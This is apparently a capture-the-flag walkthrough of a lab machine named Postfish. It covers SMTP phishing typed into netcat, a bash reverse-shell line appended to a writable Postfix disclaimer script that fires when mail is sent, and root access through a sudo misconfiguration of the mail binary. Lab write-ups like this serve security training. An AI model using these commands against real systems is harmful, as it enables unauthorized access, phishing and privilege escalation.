# 🐟 Postfish (Linux)

## 🌐 Initial Foothold

After enumerating the services, port **25 (SMTP)** was used for phishing.

📬 Send a phishing email:
```bash
nc -nv 192.168.X.X 25
```
Then type manually:
```
HELO x
MAIL FROM: it@postfish.off
RCPT TO: brian.moore@postfish.off
DATA
Subject: pg
http://192.168.Y.Y/
.
```

On attacker's machine:
```bash
sudo nc -nlvp 80
```

This sends a phishing link and sets up a listener for the callback.

---

## 🚀 Privilege Escalation

### 🔍 Enumeration

Ran `linpeas.sh` and found:
- Writable file: `/etc/postfix/disclaimer`
- Running `pspy32s` showed that `/root/disclaimer.sh` is executed by root.

📌 That `disclaimer.sh` script executes as user `filter` **whenever any email is sent**.

### 🐚 Gaining Shell as `filter`

With SSH access as `brian`, added a reverse shell payload to `/etc/postfix/disclaimer`:
```bash
echo 'bash -i >& /dev/tcp/192.168.Y.Y/80 0>&1' >> /etc/postfix/disclaimer
```

Then triggered the payload by sending another email:
```bash
nc -nv 192.168.X.X 25
```
Repeat SMTP phishing mail steps above.

On the attacker's machine:
```bash
sudo nc -nlvp 80
```

🔥 Caught a shell as user `filter`.

---

### 🧑‍💻 Root Access

Checked sudo privileges:
```bash
sudo -l
```
Output:
```
(filter) /usr/bin/mail
```

Used [GTFOBins](https://gtfobins.github.io/gtfobins/mail/) method:
```bash
sudo /usr/bin/mail --exec='!sh' brian
```

🎉 Got a root shell!

---

## 📌 Summary

- 🐟 Used phishing via SMTP (port 25) to trigger custom mail scripts.
- 🔧 Writable disclaimer file allowed code injection.
- 📬 Email triggered reverse shell as `filter`.
- 🚪 `sudo /usr/bin/mail` led to root using GTFOBins.

